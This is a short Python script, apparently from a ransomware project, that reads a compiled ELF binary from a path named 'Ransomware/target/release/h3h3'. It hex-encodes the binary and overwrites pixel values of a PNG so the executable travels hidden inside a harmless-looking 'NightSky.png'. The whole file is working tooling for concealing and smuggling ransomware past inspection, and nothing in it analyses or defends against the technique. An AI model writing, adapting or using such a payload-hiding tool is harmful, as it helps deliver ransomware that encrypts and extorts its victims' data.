import cv2

def read_image(image_path):
    return cv2.imread(image_path, cv2.IMREAD_COLOR)

def read_elf_binary(binary_path):
    with open(binary_path, 'rb') as f:
        binary_data = f.read()
    return binary_data

def binary_to_hex(binary_data):
    return binary_data.hex()

def hex_to_binary(hex_data):
    return bytes.fromhex(hex_data)

def embed_hex_in_image(image, hex_data):
    flat_image = image.flatten()
    length_of_data = len(hex_data) // 2
    length_hex = format(length_of_data, '08x') 
    full_hex_data = length_hex + hex_data

    if len(full_hex_data) * 2 > len(flat_image):
        raise ValueError("The image is too small to hold the ELF binary data.")
    
    hex_index = 0
    for i in range(0, len(flat_image), 2):
        if hex_index >= len(full_hex_data):
            break
        flat_image[i] = int(full_hex_data[hex_index:hex_index+2], 16)
        hex_index += 2

    embedded_image = flat_image.reshape(image.shape)
    return embedded_image

def save_image(image, output_path):
    cv2.imwrite(output_path, image)

def main(image_path, binary_path, output_image_path):
    image = read_image(image_path)
    elf_binary = read_elf_binary(binary_path)
    hex_data = binary_to_hex(elf_binary)
    
    embedded_image = embed_hex_in_image(image, hex_data)
    save_image(embedded_image, output_image_path)

if __name__ == "__main__":
    image_path = '../Plain_NightSky.png'
    binary_path = '../Ransomware/target/release/h3h3'
    output_image_path = '../NightSky.png'
    main(image_path, binary_path, output_image_path)
